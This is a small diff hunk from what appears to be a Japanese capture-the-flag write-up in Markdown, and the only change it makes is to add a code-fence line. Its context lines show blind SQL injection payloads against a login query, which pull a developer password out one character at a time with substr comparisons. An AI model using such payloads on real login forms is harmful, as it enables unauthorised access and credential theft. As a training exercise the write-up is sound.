@@ -20,6 +20,7 @@ SELECT * FROM users WHERE username = 'd4rk2phi' AND password ='' or substr((SELE
 SELECT * FROM users WHERE username = 'd4rk2phi' AND password ='' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),4,1) = 'C' and '1';
 SELECT * FROM users WHERE username = 'd4rk2phi' AND password ='' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),5,1) = 'T' and '1';
 SELECT * FROM users WHERE username = 'd4rk2phi' AND password ='' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),6,1) = 'F' and '1';
+~~~
 ```
 これがflagであった。  
 
